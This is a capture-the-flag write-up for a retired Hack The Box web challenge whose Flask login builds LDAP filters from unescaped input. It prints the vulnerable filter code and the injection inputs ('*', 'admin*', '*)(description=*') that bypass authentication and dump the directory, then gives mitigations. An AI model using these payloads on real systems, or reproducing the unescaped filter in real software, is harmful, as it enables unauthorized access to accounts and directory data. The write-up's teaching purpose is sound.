---
challenge: Phonebook
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, ldap, ldap-injection, auth-bypass]
---

# Phonebook — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A contact book with a login. The form does not build a SQL query but an **LDAP filter**, and wildcards slip through unescaped. `*` as both username and password authenticates, and the search box returns every entry in the directory, including the contact holding the flag in its description.

## Prompt

A Flask app with two screens: `/` (login) and `/home` (contact search by name).

## Analysis

The code filters with roughly:

```python
filtro = "(&(cn=%s)(password=%s))" % (usuario, password)
con.search_s("dc=phonebook,dc=htb", ldap.SCOPE_SUBTREE, filtro)
```

Two consequences:

1. Every value enters the filter, so `*` acts as an LDAP wildcard.
2. Returning the first match means a filter matching several users returns the first in the tree.

## Exploitation

```text
username:  *
password:  *
```

`(&(cn=*)(password=*))` matches any entry with both attributes: logged in. The search box has the same flaw:

```text
search: *
```

Every contact comes back. The listing shows `admin` (or whichever account holds the flag) with it in `description`:

```text
HTB{<flag>}
```

Chained, a tighter filter enumerates attributes:

```text
*)(description=*
```

## Pitfalls

- **Quotes and parentheses**: if the app escapes `(`, `)` and `\`, `*` still works because it is not an escape metacharacter.
- **Empty search**: an empty string just re-renders the form; send `*`.
- **`admin*` login**: when the bind is by `cn`, `admin*` also gets in and is quieter than `*`.

## Lessons

- LDAP is not SQL, but the injection is identical in concept: unescaped input inside a filter.
- A wildcard in the password field turns authentication into "the user exists".
- Mitigation: `ldap.filter.escape_filter_chars()` on every value, bind as the user, and compare the password outside the filter.
